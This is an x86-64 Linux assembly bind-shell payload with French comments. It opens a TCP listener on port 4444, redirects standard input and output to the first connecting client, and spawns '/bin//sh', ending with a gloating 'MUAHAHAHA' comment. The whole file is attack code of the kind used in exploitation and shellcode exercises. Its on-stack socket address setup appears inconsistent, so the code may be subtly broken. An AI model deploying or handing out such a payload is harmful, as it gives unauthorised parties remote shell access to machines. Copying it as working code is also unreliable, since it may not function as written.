bits 64
global _start

section .text
_start:
    ; création socket
    mov rax, 41          ; sys_socket
    mov rdi, 2          ; famille : AF_INET (ipv4)
    mov rsi, 1          ; type : SOCK_STREAM (TCP)
    xor rdx, rdx        ; protocole (ip/tcp)
    syscall

    mov rdi, rax        ; Sauvegarder descripteur sockfd dans rdi

    ; Bind socket port 4444
    xor rax, rax        
    push rax            ; Remplir sockaddr_in avec zéros (8 octets)
    mov dword [rsp-4], 0x115c0002 ; sin_port = 4444
    sub rsp, 4 
    push word 0 ; sin_addr = INADDR_ANY (0.0.0.0) 
    mov rax, 49 ; sys_bind 
    mov rsi, rsp ; Pointe vers la structure sockaddr sur la pile 
    mov rdx, 16 ; Taille de la structure (16 octets) 
    syscall

    ; listen
    mov rax, 50 ; sys_listen
    mov rsi, 2 ; backlog = 2 
    syscall

    ; accept
    mov rax, 43 ; sys_accept
    xor rsi, rsi ; addr = NULL (0) 
    xor rdx, rdx ; addrlen = NULL (0) 
    syscall 
    
    mov r9, rax ; Sauvegarder client_fd dans R9

    ; dup2 loop
    mov rsi, 2 ; stdout, stdin, stderr
loop_dup:
    mov rax, 33 ; sys_dup2
    mov rdi, r9 ; client_fd
    syscall
    dec rsi     ; -1
    jns loop_dup ; rsi >= 0

    ; sys_execve
    mov rax, 59 ; sys_execve
    xor rbx, rbx ; argv = NULL
    push rbx ; argv[0] = NULL (8octets)
    mov rbx, 0x68732f2f6e69622f ; "/bin//sh" en little-endian dynamique pour pas utiliser de chaîne de caractères (// pour push 8 octets)
    push rbx ; 
    mov rdi, rsp ; argv[0] = "/bin//sh"
    xor rsi, rsi ; argv = NULL
    xor rdx, rdx ; envp = NULL
    syscall  ; remplacement du processus par shell MUAHAHAHA!!!


